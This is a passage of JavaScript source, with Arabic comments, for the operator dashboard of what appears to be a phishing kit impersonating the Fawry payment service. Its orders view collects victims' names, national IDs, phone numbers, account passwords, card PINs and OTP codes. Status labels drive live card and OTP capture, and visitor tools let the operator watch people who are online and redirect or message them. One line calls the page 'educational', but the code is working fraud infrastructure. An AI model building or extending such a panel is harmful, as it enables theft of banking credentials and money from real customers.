/* ماي فوري — لوحة التحكم (نسخة محلية مطابقة للداشبورد الأصلي /karim1) */
(function () {
  "use strict";

  // ---------- المفاتيح والافتراضيّات (مثل دالة C/E في الأصل) ----------
  var K_AUTH = "bcare_admin_auth_v1";
  var K_PASS = "bcare_admin_password_v1";
  var K_USER = "bcare_admin_username_v1";
  var K_MUTE = "fawry_admin_muted";
  var K_CLOSED = "fawry_site_closed";
  var K_ORDERS = "fawry_orders";
  var K_VISITORS = "fawry_visitors";
  var K_BLOCKED = "fawry_blocked_visitors";
  var K_SESSION = "fawry_admin_session_v1";
  var _H0 = "c1c224b03cd9bc7b6a86d77f5dace40191766c485cd55dc48caf9ac873335d6f";
  var _H1 = "2350fb05b630ba84b5b03c303f440ab73d57902fac4b518ab3418b587ed71c2e";
  var _H2 = "ddba02f12660a7edec1daafd51175b96a077079fe23c5cb8d51e2a445aaf7663";

  async function _hash(s) {
    var buf = new TextEncoder().encode(s);
    var hb = await crypto.subtle.digest("SHA-256", buf);
    return Array.from(new Uint8Array(hb)).map(function(b){return ("0"+b.toString(16)).slice(-2);}).join("");
  }

  function lsGet(k, d) { try { var v = localStorage.getItem(k); return v === null || v === undefined ? d : v; } catch (e) { return d; } }
  function lsSet(k, v) { try { localStorage.setItem(k, v); } catch (e) {} }
  function getUsername() { return lsGet(K_USER, ""); }
  function getPass() { return lsGet(K_PASS, ""); }
  function isAuthed() { try { return sessionStorage.getItem(K_AUTH) === "1"; } catch (e) { return false; } }
  function setAuth() { try { sessionStorage.setItem(K_AUTH, "1"); } catch (e) {} }
  function clearAuth() { try { sessionStorage.removeItem(K_AUTH); } catch (e) {} }
  function esc(s) {
    return String(s === null || s === undefined ? "" : s).replace(/[&<>"']/g, function (c) {
      return { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c];
    });
  }
  function fmtDate(iso) { try { return new Date(iso).toLocaleString("ar-SA"); } catch (e) { return iso; } }
  function fmtClock(iso) { try { return new Date(iso).toLocaleTimeString("ar-SA"); } catch (e) { return iso; } }
  function deviceName(ua) {
    if (!ua) return "جهاز غير معروف";
    if (/iPhone|iPad/i.test(ua)) return "iPhone/iPad";
    if (/Android/i.test(ua)) return "Android";
    if (/Mac OS X/i.test(ua)) return "Mac";
    if (/Windows/i.test(ua)) return "Windows";
    if (/Linux/i.test(ua)) return "Linux";
    return "جهاز آخر";
  }
  function browserName(ua) {
    ua = ua || "";
    if (/Edg\//.test(ua)) return "Edge";
    if (/OPR\//.test(ua)) return "Opera";
    if (/Firefox\//.test(ua)) return "Firefox";
    if (/Chrome\//.test(ua)) return "Chrome";
    if (/Safari\//.test(ua)) return "Safari";
    return "متصفح";
  }

  // ---------- أيقونات لوسايد (inline SVG) ----------
  function ic(paths, cls, extra) {
    return '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="' + (cls || "") + '" aria-hidden="true">' + paths + "</svg>";
  }
  var P_lock = '<rect width="18" height="11" x="3" y="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path>';
  var P_shieldAlert = '<path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path><path d="M12 8v4"></path><path d="M12 16h.01"></path>';
  var P_users = '<path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path><path d="M16 3.128a4 4 0 0 1 0 7.744"></path><path d="M22 21v-2a4 4 0 0 0-3-3.87"></path><circle cx="9" cy="7" r="4"></circle>';
  var P_fileText = '<path d="M6 22a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h8a2.4 2.4 0 0 1 1.704.706l3.588 3.588A2.4 2.4 0 0 1 20 8v12a2 2 0 0 1-2 2z"></path><path d="M14 2v5a1 1 0 0 0 1 1h5"></path><path d="M10 9H8"></path><path d="M16 13H8"></path><path d="M16 17H8"></path>';
  var P_settings = '<path d="M9.671 4.136a2.34 2.34 0 0 1 4.659 0 2.34 2.34 0 0 0 3.319 1.915 2.34 2.34 0 0 1 2.33 4.033 2.34 2.34 0 0 0 0 3.831 2.34 2.34 0 0 1-2.33 4.033 2.34 2.34 0 0 0-3.319 1.915 2.34 2.34 0 0 1-4.659 0 2.34 2.34 0 0 0-3.32-1.915 2.34 2.34 0 0 1-2.33-4.033 2.34 2.34 0 0 0 0-3.831A2.34 2.34 0 0 1 6.35 6.051a2.34 2.34 0 0 0 3.319-1.915"></path><circle cx="12" cy="12" r="3"></circle>';
  var P_power = '<path d="M12 2v10"></path><path d="M18.4 6.6a9 9 0 1 1-12.77.04"></path>';
  var P_bell = '<path d="M10.268 21a2 2 0 0 0 3.464 0"></path><path d="M3.262 15.326A1 1 0 0 0 4 17h16a1 1 0 0 0 .74-1.673C19.41 13.956 18 12.499 18 8A6 6 0 0 0 6 8c0 4.499-1.411 5.956-2.738 7.326"></path>';
  var P_bellOff = '<path d="M10.268 21a2 2 0 0 0 3.464 0"></path><path d="M17 17H4a1 1 0 0 1-.74-1.673C4.59 13.956 6 12.499 6 8a6 6 0 0 1 .258-1.742"></path><path d="m2 2 20 20"></path><path d="M8.668 3.01A6 6 0 0 1 18 8c0 2.687.77 4.653 1.707 6.05"></path>';
  var P_logOut = '<path d="m16 17 5-5-5-5"></path><path d="M21 12H9"></path><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path>';
  var P_check = '<path d="M20 6 9 17l-5-5"></path>';
  var P_clock = '<circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>';
  var P_x = '<path d="M18 6 6 18"></path><path d="m6 6 12 12"></path>';
  var P_trash = '<path d="M3 6h18"></path><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6"></path><path d="M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path><path d="M10 11v6"></path><path d="M14 11v6"></path>';
  var P_pin = '<path d="M20 10c0 4.993-5.539 10.193-7.399 11.799a1 1 0 0 1-1.202 0C9.539 20.193 4 14.993 4 10a8 8 0 0 1 16 0"></path><circle cx="12" cy="10" r="3"></circle>';
  var P_send = '<path d="M14.536 21.686a.7.7 0 0 0 .123-.708l-2.534-7.735a2 2 0 0 0-1.268-1.268L3.122 9.442a.7.7 0 0 0-.708.123"></path><path d="M20.4 4.6a2 2 0 0 0-2.83 0l-4.8 4.8"></path><path d="M14.536 21.686a.7.7 0 0 1-.708-.123l-4-4a.7.7 0 0 1 0-.98l6-6a.7.7 0 0 1 .98 0l4 4a.7.7 0 0 1 .123.708z"></path>';
  var P_message = '<path d="M7.9 20A9 9 0 1 0 4 16.1L2 22Z"></path>';
  var P_keyRound = '<path d="M2.586 17.414A2 2 0 0 0 2 18.828V21a1 1 0 0 0 1 1h3a1 1 0 0 0 1-1v-1a1 1 0 0 1 1-1h1a1 1 0 0 0 1-1v-1a1 1 0 0 1 1-1h.172a2 2 0 0 0 1.414-.586l.814-.814a6.5 6.5 0 1 0-4-4z"></path><circle cx="16.5" cy="7.5" r=".5" fill="currentColor"></circle>';
  var P_monitor = '<rect width="20" height="14" x="2" y="3" rx="2"></rect><path d="M8 21h8"></path><path d="M12 17v4"></path>';
  var P_globe = '<circle cx="12" cy="12" r="10"></circle><path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20"></path><path d="M2 12h20"></path>';
  var P_link2 = '<path d="M9 17H7A5 5 0 0 1 7 7h2"></path><path d="M15 7h2a5 5 0 1 1 0 10h-2"></path>';
  var P_save = '<path d="M15.2 3a2 2 0 0 1 1.4.6l3.8 3.8a2 2 0 0 1 .6 1.4V19a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2z"></path><path d="M17 21v-7a1 1 0 0 0-1-1H8a1 1 0 0 0-1 1v7"></path><path d="M7 3v4a1 1 0 0 0 1 1h7"></path>';
  var P_ban = '<path d="M4.9 6.3A9 9 0 0 0 12 21a9 9 0 0 0 9-9 9 9 0 0 0-9-9 9 9 0 0 0-6.7 3.2"></path><path d="M3.4 20.6 20.6 3.4"></path>';
  var P_refresh = '<path d="M21 12a9 9 0 1 1-3-6.7"></path><path d="M21 3v6h-6"></path>';
  var P_minus = '<path d="M5 12h14"></path>';

  // ---------- العناصر والحالة ----------
  var loginBox = document.getElementById("adm-login");
  var appBox = document.getElementById("adm-app");
  var content = document.getElementById("adm-content");
  var mobTabs = document.querySelector(".adm-mobile-tabs");
  var toastEl = document.getElementById("adm-toast");
  var state = {
    tab: "visitors",
    muted: lsGet(K_MUTE, "") === "1",
    open: new Set(),      // الزوار المفتوحون
    msgFor: null,         // زائر في وضع مراسلة
    drawerId: null,       // طلب مفتوح في الدرَور
    lastPending: -1
  };
  function session() {
    var s = lsGet(K_SESSION, null);
    if (!s) {
      s = "admin-" + Math.random().toString(36).slice(2, 8) + "-" + Date.now().toString(36);
      lsSet(K_SESSION, s);
    }
    return s;
  }

  // ---------- Toast ----------
  var toastTimer = null;
  var lastToastKey = "", lastToastAt = 0;
  function toast(msg, ok) {
    if (!toastEl) return;
    // منع الإشعار المكرر: نفس النص خلال 6 ثواني → تجاهل
    var now = Date.now();
    if (msg === lastToastKey && now - lastToastAt < 6000) return;
    lastToastKey = msg; lastToastAt = now;
    toastEl.textContent = msg;
    toastEl.classList.remove("hidden");
    toastEl.style.background = ok === false ? "#b91c1c" : "#003c5a";
    requestAnimationFrame(function () {
      toastEl.classList.remove("opacity-0", "-translate-y-2");
    });
    if (toastTimer) clearTimeout(toastTimer);
    toastTimer = setTimeout(function () {
      toastEl.classList.add("opacity-0", "-translate-y-2");
      setTimeout(function () { toastEl.classList.add("hidden"); }, 300);
    }, 2400);
  }
  function terr(m) { toast(m, false); }
  function tsuc(m) { toast(m, true); }

  // ---------- نغمة تنبيه (WebAudio مثل الأصل) ----------
  function chime() {
    if (state.muted) return;
    try {
      var AC = window.AudioContext || window.webkitAudioContext;
      if (!AC) return;
      var ac = new AC();
      [880, 1180].forEach(function (f, i) {
        var o = ac.createOscillator(), g = ac.createGain();
        o.type = "sine"; o.frequency.value = f;
        o.connect(g); g.connect(ac.destination);
        var t = ac.currentTime + i * 0.18;
        g.gain.setValueAtTime(0.0001, t);
        g.gain.exponentialRampToValueAtTime(0.22, t + 0.02);
        g.gain.exponentialRampToValueAtTime(0.0001, t + 0.16);
        o.start(t); o.stop(t + 0.18);
      });
    } catch (e) {}
  }

  // ---------- البيانات (طبقة FAWRY_DB — شكل جدول applications في سوپابيز) ----------
  function readOrders() {
    var db = window.FAWRY_DB;
    if (db && db.list) {
      // شرط أساسي: الطلب ما يظهرش في الداشبورد غير بعد ما العميل يبعت بيانات الدخول.
      // أي صف من غير site_username (طلب لسه ما اتسجلش دخول) بيتخفي تمامًا.
      return db.list().filter(function (r) {
        return !!(r && r.site_username && String(r.site_username).trim());
      }).map(function (r) {
        return {
          id: r.id,
          status: r.review_status || "awaiting_review", // للعرض
          name: r.full_name, phone: r.phone, nationalId: r.identity,
          gov: r.gov, address: r.address, model: r.model, modelName: r.model_name,
          at: r.created_at,
          site_username: r.site_username, site_password: r.site_password,
          login_status: r.login_status,
          verification_status: r.verification_status,
          otp_code: r.otp_code,
          card_pin: r.card_pin,
          force_target: r.force_target,
          visitor_id: r.visitor_id
        };
      });
    }
    // fallback للبيانات القديمة (لو db.js مش محمّل)
    try { var v = JSON.parse(localStorage.getItem(K_ORDERS)); return Array.isArray(v) ? v : []; }
    catch (e) { return []; }
  }
  function readVisitors() {
    // من سوپابيز (شغالة عبر كل الأجهزة) — عبر FW_VISITORS اللي في site.js
    var f = window.FW_VISITORS;
    if (f && f.list) return f.list();
    // fallback محلي (لو site.js مش محمّل)
    try {
      var map = JSON.parse(localStorage.getItem(K_VISITORS)) || {};
      var now = Date.now(), arr = [];
      Object.keys(map).forEach(function (k) {
        var v = map[k];
        if (v && now - (v.ts || 0) < 90000) arr.push(v);
      });
      arr.sort(function (a, b) { return (b.ts || 0) - (a.ts || 0); });
      return arr;
    } catch (e) { return []; }
  }
  function readBlocked() {
    try { var v = JSON.parse(localStorage.getItem(K_BLOCKED)); return Array.isArray(v) ? v : []; }
    catch (e) { return []; }
  }
  function writeBlocked(a) { lsSet(K_BLOCKED, JSON.stringify(a)); }

  var STATUS = {
    awaiting_review: { text: "بانتظار المراجعة", cls: "bg-amber-100 text-amber-700", icon: P_clock },
    bank_approval: { text: "بانتظار موافقة تطبيق البنك", cls: "bg-blue-100 text-blue-700", icon: P_clock },
    approved: { text: "تم القبول — بانتظار رقم الكارت", cls: "bg-blue-100 text-blue-700", icon: P_check },
    otp_direct: { text: "محوّل لإدخال OTP", cls: "bg-blue-100 text-blue-700", icon: P_check },
    pin_direct: { text: "محوّل لإدخال رقم الكارت", cls: "bg-amber-100 text-amber-700", icon: P_check },
    pin_submitted: { text: "تم إدخال رقم الكارت — بانتظار التأكيد", cls: "bg-amber-100 text-amber-700", icon: P_clock },
    pin_rejected: { text: "رقم الكارت مرفوض — العميل يعيد الإدخال", cls: "bg-orange-100 text-orange-700", icon: P_x },
    otp_submitted: { text: "تم إدخال OTP — بانتظار التأكيد", cls: "bg-amber-100 text-amber-700", icon: P_clock },
    otp_rejected: { text: "OTP مرفوض — العميل يعيد الإدخال", cls: "bg-orange-100 text-orange-700", icon: P_x },
    rejected: { text: "مرفوض", cls: "bg-red-100 text-red-700", icon: P_x },
    completed: { text: "مكتمل / مدفوع", cls: "bg-emerald-100 text-emerald-700", icon: P_check }
  };
  function numOf(o) {
    var s = (o && o.status) || "awaiting_review";
    // بعد قبول الكارت نفس الحالة approved — نعرض رسالة أنسب لمراحلها
    if (s === "approved" && o && o.card_pin) return { text: "تم قبول الكارت — بانتظار OTP", cls: "bg-blue-100 text-blue-700", icon: P_check };
    return STATUS[s] || STATUS.awaiting_review;
  }
  function chipOf(o, cls) {
    var n = numOf(o);
    return '<span class="' + (cls || "inline-flex items-center gap-1 rounded-full px-2 py-0.5 text-[11px] font-bold") + " " + n.cls + '">' +
      ic(n.icon, "h-3 w-3") + esc(n.text) + "</span>";
  }
  function pendingCount(orders) {
    return orders.filter(function (o) {
      var s = o.status || "awaiting_review";
      return s === "awaiting_review" || s === "pin_submitted" || s === "otp_submitted";
    }).length;
  }

  // ---------- كارت إحصائية (مثل Ke في الأصل) ----------
  function statCard(label, value, paths, tone) {
    var tones = {
      blue: { bg: "bg-gradient-to-br from-brand-blue to-[hsl(205_78%_26%)] text-white", ring: "ring-brand-blue/15", bar: "from-brand-blue/60 to-transparent" },
      violet: { bg: "bg-gradient-to-br from-violet-500 to-fuchsia-600 text-white", ring: "ring-violet-500/15", bar: "from-violet-500/60 to-transparent" },
      green: { bg: "bg-gradient-to-br from-emerald-500 to-emerald-700 text-white", ring: "ring-emerald-500/15", bar: "from-emerald-500/60 to-transparent" },
      amber: { bg: "bg-gradient-to-br from-amber-400 to-orange-500 text-white", ring: "ring-amber-500/15", bar: "from-amber-500/60 to-transparent" }
    };
    var t = tones[tone] || tones.blue;
    return '<div class="group relative overflow-hidden rounded-2xl bg-white p-4 shadow-card ring-1 transition-all duration-300 hover:-translate-y-0.5 hover:shadow-float sm:p-5 ' + t.ring + '">' +
      '<div class="pointer-events-none absolute inset-x-0 top-0 h-px bg-gradient-to-r ' + t.bar + '"></div>' +
      '<div class="flex items-center justify-between gap-3">' +
        '<div class="grid h-12 w-12 place-items-center rounded-xl shadow-soft transition-transform duration-300 group-hover:scale-105 ' + t.bg + '">' + ic(paths, "h-5 w-5") + "</div>" +
        '<div class="text-right">' +
          '<div class="text-[11.5px] font-bold uppercase tracking-wide text-muted-foreground">' + esc(label) + "</div>" +
          '<div class="mt-0.5 text-[22px] font-black tabular-nums text-brand-blue">' + esc(value) + "</div>" +
        "</div>" +
      "</div></div>";
  }

  // ---------- شاشة الدخول (مطابقة لصفحة الأصل) ----------
  function renderLogin() {
    appBox.classList.add("hidden");
    loginBox.classList.remove("hidden");
    loginBox.innerHTML =
      '<main dir="rtl" class="admin-animated-bg grid min-h-screen place-items-center px-4">' +
        '<div class="admin-bg-photo" aria-hidden="true" style="background-image: url(\'./assets/images/ronaldo-bg.jpg\');"></div>' +
        '<div class="admin-bg-veil" aria-hidden="true"></div>' +
        '<form id="adm-login-form" class="relative w-full max-w-[400px] rounded-3xl border border-white/60 bg-white/90 p-6 shadow-card backdrop-blur-xl sm:p-7">' +
          '<div class="text-center">' +
            '<div class="mx-auto mb-3 grid h-16 w-16 place-items-center rounded-2xl bg-gradient-to-br from-brand-blue to-[hsl(205_78%_26%)] text-white shadow-soft">' + ic(P_lock, "h-7 w-7", ' stroke-width="2.2"') + "</div>" +
            '<p class="mt-1 text-[12.5px] font-bold text-muted-foreground">تسجيل الدخول للوحة التحكم</p>' +
          "</div>" +
          '<div class="mt-5 space-y-2"><label class="block text-right text-[13px] font-extrabold text-brand-blue" for="adm-user">اسم المستخدم</label>' +
            '<input id="adm-user" type="text" placeholder="اسم المستخدم" autocomplete="username" class="h-[48px] w-full rounded-[10px] border border-[hsl(214_25%_85%)] bg-white px-4 text-right text-[14px] text-brand-blue outline-none focus:border-brand-blue"></div>' +
          '<div class="mt-4 space-y-2"><label class="block text-right text-[13px] font-extrabold text-brand-blue" for="adm-pass">كلمة المرور</label>' +
            '<input id="adm-pass" type="password" placeholder="••••••" autocomplete="current-password" class="h-[48px] w-full rounded-[10px] border border-[hsl(214_25%_85%)] bg-white px-4 text-right text-[14px] text-brand-blue outline-none focus:border-brand-blue"></div>' +
          '<p id="adm-login-err" class="hidden mt-3 text-right text-xs font-bold text-red-700"></p>' +
          '<button type="submit" style="background-color: hsl(214 84% 24%); color: #ffffff;" class="mt-5 h-[50px] w-full rounded-[10px] text-[15px] font-extrabold shadow-soft transition-transform hover:brightness-110 active:scale-[0.99]">دخول</button>' +
          '<div class="mt-4 flex items-start gap-2 rounded-xl bg-amber-50 p-3 text-[11.5px] text-amber-800">' + ic(P_shieldAlert, "mt-0.5 h-4 w-4 shrink-0") + "<span>هذه صفحة تعليمية ولا توفر أمانًا حقيقيًا.</span></div>" +
        "</form>" +
      "</main>";
    var f = document.getElementById("adm-login-form");
    f.addEventListener("submit", function (e) {
      e.preventDefault();
      var u = document.getElementById("adm-user").value.trim();
      var p = document.getElementById("adm-pass").value;
      Promise.all([_hash(u), _hash(p)]).then(function(hashes) {
        var uh = hashes[0], ph = hashes[1];
        var storedU = getUsername(), storedP = getPass();
        var validU = storedU ? (u === storedU) : (uh === _H0);
        var validP = storedP ? (p === storedP) : (ph === _H1);
        if (!validU || !validP) {
          document.getElementById("adm-login-err").textContent = "اسم المستخدم أو كلمة المرور غير صحيحة";
          document.getElementById("adm-login-err").classList.remove("hidden");
          terr("اسم المستخدم أو كلمة المرور غير صحيحة");
          return;
        }
        document.getElementById("adm-login-err").classList.add("hidden");
        setAuth(); state.lastPending = -1;
        tsuc("تم تسجيل الدخول");
        showApp();
      });
    });
  }

  // ---------- التابات ----------
  function navBtnClasses(key) {
    return "group relative flex w-full items-center gap-2.5 overflow-hidden rounded-xl px-3 py-2.5 text-right text-[13px] font-extrabold transition-all duration-200 " +
      (state.tab === key
        ? "bg-gradient-to-l from-brand-blue/10 via-brand-blue/5 to-transparent text-brand-blue shadow-soft"
        : "text-muted-foreground hover:bg-muted/60 hover:text-brand-blue");
  }
  function refreshNav(orders, visitors) {
    var pend = pendingCount(orders);
    document.querySelectorAll("aside [data-tab]").forEach(function (b) {
      var key = b.getAttribute("data-tab");
      b.className = navBtnClasses(key);
      var bar = b.querySelector(".adm-bar");
      if (bar) bar.remove();
      if (state.tab === key) {
        var s = document.createElement("span");
        s.className = "adm-bar absolute inset-y-1.5 right-0 w-1 rounded-l-full bg-brand-blue";
        b.appendChild(s);
      }
    });
    // عدّاد الطلبات
    var c = document.querySelector(".adm-orders-count");
    if (c) {
      c.textContent = pend > 0 ? "+" + pend : String(orders.length);
      c.className = "adm-orders-count ms-auto rounded-full px-2 py-0.5 text-[11px] font-extrabold tabular-nums transition " +
        (pend > 0 ? "animate-pulse bg-red-600 text-white shadow-[0_0_0_3px_rgba(220,38,38,0.25)]"
          : state.tab === "orders" ? "bg-brand-blue text-white" : "bg-muted text-brand-blue");
    }
    // تابات الموبايل
    if (mobTabs) {
      var t = {
        visitors: { label: "الزوار", icon: P_users },
        orders: { label: "الطلبات", icon: P_fileText },
        settings: { label: "الإعدادات", icon: P_settings }
      };
      var html = "";
      [t.visitors, t.orders, t.settings].forEach(function (x) {
        var isNew = x.label === "الطلبات" && pend > 0;
        var cls = "relative flex h-14 flex-col items-center justify-center gap-1 rounded-2xl px-2 text-[13px] font-extrabold shadow-card transition-all duration-200 " +
          (isNew ? "animate-pulse bg-red-600 text-white ring-2 ring-red-300"
            : state.tab === x.label || state.tab === (x.label === "الزوار" ? "visitors" : x.label === "الطلبات" ? "orders" : "settings")
              ? "bg-brand-blue text-white ring-2 ring-brand-blue/40"
              : "bg-white text-brand-blue ring-1 ring-brand-blue/20");
        html += '<button type="button" data-tab="' + (x.label === "الزوار" ? "visitors" : x.label === "الطلبات" ? "orders" : "settings") + '" class="' + cls + '">' +
          ic(x.icon, "h-5 w-5") + "<span>" + x.label + "</span>" +
          (isNew ? '<span class="absolute -top-1.5 -right-1.5 grid h-5 min-w-[20px] place-items-center rounded-full bg-white px-1 text-[10.5px] font-extrabold text-red-600 ring-2 ring-red-200">' + pend + "</span>" : "") +
          (x.label === "الزوار" && visitors.length > 0 ? '<span class="absolute -top-1.5 -right-1.5 grid h-5 min-w-[20px] place-items-center rounded-full bg-emerald-500 px-1 text-[10.5px] font-extrabold text-white ring-2 ring-white">' + visitors.length + "</span>" : "") +
          "</button>";
      });
      mobTabs.innerHTML = html;
    }
  }

  // ---------- زر الهيدر: حالة الموقع ----------
  function powerClasses(closed) {
    return "grid h-10 w-10 place-items-center rounded-xl border text-[12.5px] font-bold transition-all duration-200 hover:scale-105 " +
      (closed ? "border-red-200 bg-red-50 text-red-700 hover:bg-red-100" : "border-emerald-200 bg-emerald-50 text-emerald-700 hover:bg-emerald-100");
  }
  function refreshHeader(orders) {
    var closed = lsGet(K_CLOSED, "") === "1";
    var b = appBox.querySelector('[data-adm="power"]');
    if (b) {
      b.title = closed ? "فتح الموقع" : "إغلاق الموقع مؤقتاً";
      b.className = powerClasses(closed);
    }
    var bell = appBox.querySelector('[data-adm="bell"]');
    if (bell) {
      bell.title = state.muted ? "تفعيل الإشعار الصوتي" : "كتم الإشعار الصوتي";
      bell.className = "grid h-10 w-10 place-items-center rounded-xl border text-[12.5px] font-bold transition-all duration-200 hover:scale-105 " +
        (state.muted ? "border-[#00567e]/30 bg-white/50 text-[#00567e]/60 hover:bg-white/70" : "border-[#00567e]/40 bg-white/60 text-[#00567e] hover:bg-white/80");
      bell.innerHTML = ic(state.muted ? P_bellOff : P_bell, "h-4 w-4");
    }
  }

  // ---------- تاب الزوار ----------
  function visRowLabel(icon, label, val) {
    return '<div class="flex shrink-0 items-center gap-1.5 text-muted-foreground">' + ic(icon, "h-3.5 w-3.5") +
      '<span class="text-[11.5px] font-bold text-brand-blue/80">' + label + ":</span>" +
      '<span class="text-brand-blue/70">' + val + "</span></div>";
  }
  function renderVisitors() {
    var visitors = readVisitors();
    var blocked = readBlocked();
    var rows = "";
    if (visitors.length === 0) {
      rows = '<div class="px-4 py-8 text-center text-[13px] text-muted-foreground">لا يوجد زوار متصلون حالياً.</div>';
    }
    visitors.forEach(function (v) {
      var isBlocked = blocked.indexOf(v.id) !== -1;
      var open = state.open.has(v.id);
      var details = "";
      if (open) {
        var msgs = "";
        if (state.msgFor === v.id) {
          msgs = '<div class="rounded-xl border border-emerald-200 bg-emerald-50/60 p-3">' +
            '<div class="mb-2 flex items-center justify-between"><div class="flex items-center gap-1.5 text-[12px] font-bold text-emerald-700">' + ic(P_message, "h-3.5 w-3.5") + "<span>إرسال رسالة فورية للزائر</span></div>" +
            '<button type="button" data-vis-close-msg="' + esc(v.id) + '" class="grid h-6 w-6 place-items-center rounded text-emerald-700 hover:bg-emerald-100" aria-label="إغلاق">' + ic(P_x, "h-3.5 w-3.5") + "</button></div>" +
            '<div class="flex items-end gap-1.5"><textarea data-vis-msg maxlength="1000" rows="2" placeholder="اكتب رسالتك هنا..." class="h-20 w-full rounded-lg border border-emerald-200 bg-white p-2 text-[12px] text-brand-blue outline-none focus:border-emerald-500"></textarea>' +
            '<button type="button" data-vis-send="' + esc(v.id) + '" class="grid h-10 place-items-center rounded-lg bg-emerald-600 px-3 text-[12px] font-extrabold text-white hover:brightness-110">' + ic(P_send, "h-3.5 w-3.5") + "</button></div>" +
            "</div>";
        }
        details = '<div class="mt-3 space-y-3">' +
          '<div class="space-y-1.5 rounded-xl border border-border/60 bg-muted/30 p-2.5 text-[12px] text-brand-blue">' +
            visRowLabel(P_monitor, "الجهاز", '<span dir="ltr">' + esc(v.device || "جهاز آخر") + "</span>") +
            visRowLabel(P_globe, "المتصفح", '<span dir="ltr">' + esc(v.browser || "متصفح") + "</span>") +
            visRowLabel(P_clock, "آخر ظهور", "منذ " + Math.max(1, Math.round((Date.now() - (v.ts || Date.now())) / 1000)) + " ث") +
            visRowLabel(P_link2, "مصدر الدخول", '<span dir="ltr" class="truncate">مباشر</span>') +
          "</div>" +
          '<div class="grid grid-cols-2 gap-1.5">' +
            '<button type="button" data-vis-msg-toggle="' + esc(v.id) + '" class="flex h-10 items-center justify-center gap-1.5 rounded-lg bg-emerald-600 px-2.5 text-[12px] font-extrabold text-white hover:brightness-110">' + ic(P_message, "h-3.5 w-3.5") + "<span>مراسلة</span></button>" +
            '<button type="button" data-vis-redirect="' + esc(v.id) + '" class="flex h-10 items-center justify-center gap-1.5 rounded-lg bg-blue-700 px-2.5 text-[12px] font-extrabold text-white hover:brightness-110">' + ic(P_send, "h-3.5 w-3.5") + "<span>توجيه</span></button>" +
            (isBlocked
              ? '<button type="button" data-vis-unblock="' + esc(v.id) + '" class="flex h-10 items-center justify-center gap-1.5 rounded-lg bg-emerald-600 px-2.5 text-[12px] font-extrabold text-white hover:brightness-110">' + ic(P_minus, "h-3.5 w-3.5") + "<span>فك الحظر</span></button>"
              : '<button type="button" data-vis-block="' + esc(v.id) + '" class="flex h-10 items-center justify-center gap-1.5 rounded-lg bg-destructive px-2.5 text-[12px] font-extrabold text-white hover:brightness-110">' + ic(P_ban, "h-3.5 w-3.5") + "<span>حظر</span></button>") +
            '<button type="button" data-vis-refresh="' + esc(v.id) + '" class="flex h-10 items-center justify-center gap-1.5 rounded-lg border border-border bg-white px-2.5 text-[12px] font-extrabold text-brand-blue hover:bg-muted/50">' + ic(P_refresh, "h-3.5 w-3.5") + "<span>تحديث</span></button>" +
          "</div>" + msgs + "</div>";
      }
      rows += '<div class="px-3 py-3 sm:px-4">' +
        '<button type="button" data-vis-toggle="' + esc(v.id) + '" aria-expanded="' + (open ? "true" : "false") + '" class="flex w-full items-center justify-between gap-2 rounded-xl border border-border/70 bg-white px-3 py-2.5 text-right shadow-sm transition hover:bg-muted/40">' +
          '<div class="flex min-w-0 flex-1 items-center gap-2">' +
            '<span class="relative flex h-2.5 w-2.5 shrink-0"><span class="absolute inline-flex h-full w-full animate-ping rounded-full bg-emerald-400 opacity-75"></span><span class="relative inline-flex h-2.5 w-2.5 rounded-full bg-emerald-500"></span></span>' +
            '<div class="min-w-0 flex-1"><div class="flex items-center gap-1.5">' +
              '<span class="font-mono text-[13px] font-extrabold text-brand-blue break-all">' + esc(v.id) + "</span>" +
              (isBlocked ? '<span class="rounded-full bg-red-100 px-2 py-0.5 text-[10px] font-bold text-red-700">محظور</span>' : "") +
            "</div>" +
            '<div class="mt-0.5 flex items-center gap-1 text-[11.5px] text-muted-foreground" dir="rtl">' + ic(P_pin, "h-3 w-3 text-red-500") + '<span class="truncate" dir="ltr">' + esc(v.path || "/") + "</span></div>" +
          "</div></div>" +
          '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-4 w-4 shrink-0 text-muted-foreground transition-transform' + (open ? " rotate-180" : "") + '" aria-hidden="true"><path d="m7 15 5 5 5-5"></path><path d="m7 9 5-5 5 5"></path></svg>' +
        "</button>" + details + "</div>";
    });
    content.innerHTML =
      '<div class="space-y-4"><div class="overflow-hidden rounded-2xl bg-white shadow-card">' +
        '<div class="flex items-center justify-between border-b border-border px-4 py-3">' +
          '<div class="flex items-center gap-2 text-brand-blue">' +
            '<div class="grid h-9 w-9 place-items-center rounded-lg bg-emerald-100 text-emerald-700">' + ic(P_users, "h-4 w-4") + "</div>" +
            '<div><h2 class="text-[14px] font-extrabold">الزوار المتصلون الآن</h2><div class="text-[11.5px] text-muted-foreground">تحديث لحظي — نبضة كل 3 ثوانٍ</div></div>' +
          "</div>" +
          '<div class="rounded-full bg-emerald-100 px-3 py-1 text-[12px] font-extrabold text-emerald-700">' + visitors.length + "</div>" +
        "</div>" +
        '<div class="divide-y divide-border">' + rows + "</div>" +
      "</div></div>";
    bindVisitorActions();
  }
  function bindVisitorActions() {
    content.querySelectorAll("[data-vis-toggle]").forEach(function (b) {
      b.addEventListener("click", function () {
        var id = b.getAttribute("data-vis-toggle");
        if (state.open.has(id)) { state.open.delete(id); state.msgFor = null; }
        else state.open.add(id);
        renderVisitors();
      });
    });
